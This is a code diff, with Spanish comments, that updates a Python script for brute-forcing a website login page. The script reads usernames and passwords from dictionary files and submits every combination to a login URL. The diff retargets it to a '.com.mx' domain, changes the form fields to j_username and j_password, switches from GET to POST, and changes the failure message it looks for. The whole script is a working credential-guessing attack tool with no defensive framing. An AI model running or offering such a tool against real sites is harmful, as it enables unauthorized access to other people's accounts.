@@ -3,7 +3,7 @@ import ssl
 from io import BytesIO
 
 #Direccion de pagina WEB
-url="https://dominio.com/login"
+url="https://dominio.com.mx/login"
 print ('Inicia proceso')
 #filepath aqui va la ruta del archivo que ocuparemos para diccionario de usuarios
 #filepath2 aqui va la ruta del archivo que ocuparemos para diccionario de contraseñas
@@ -21,13 +21,13 @@ with open(filepath) as fp:
           cnt2 = 1
           while line2:
               pas=''+line2.strip()
-              data = {"username": usr, "password": pas}
-              print url
-              print data
+              data = {"j_username": usr, "j_password": pas, "locale":"es"}
+              print (url)
+              print (data)
               get_body=''
-              get_body = requests.get(url, data).text
+              get_body = requests.post(url, data).text
 			  #aqui puedes buscar una cadena especifica en la cadena que regresa 
-              if (get_body.find('Usuario o Contraseña incorrecto') != -1 ):
+              if (get_body.find('Credenciales no encontradas') != -1 ):
                    print ("---> MENSAJE DATOS INCORRECTOS")
 				   #print (get_body)
               else:
